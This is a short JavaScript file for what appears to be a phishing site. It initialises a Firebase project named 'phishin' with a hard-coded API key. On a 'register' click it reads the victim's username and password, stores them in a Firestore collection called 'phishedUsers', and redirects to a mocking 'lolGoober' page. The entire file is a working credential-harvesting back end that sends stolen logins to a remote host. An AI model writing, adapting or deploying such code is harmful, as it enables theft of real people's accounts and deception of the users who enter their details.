import { initializeApp } from "firebase/app"
import {
    getFirestore, 
    collection,
    addDoc
} from "firebase/firestore"

const firebaseConfig = {
    apiKey: "AIzaSyD7mrVW7TMlaHhfVtorqaDX6qlcpoPinWg",
    authDomain: "phishin-69dd8.firebaseapp.com",
    projectId: "phishin-69dd8",
    storageBucket: "phishin-69dd8.appspot.com",
    messagingSenderId: "458830227136",
    appId: "1:458830227136:web:a7ccb356f4c86d038f2f25",
    measurementId: "G-WWH8VYGLMS"
  };


initializeApp(firebaseConfig)

// Database connection
const db = getFirestore()

const colRef = collection(db, "phishedUsers")

const registerButton = document.getElementById('register')
registerButton.addEventListener("click", registerUser)

function registerUser() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;


    // Add username and password to the database
    addDoc(colRef, {
        Username: username,
        Password: password
    })
    .then(() => {
        window.location.href = '/Phishing/dist/lolGoober.html';
    })
}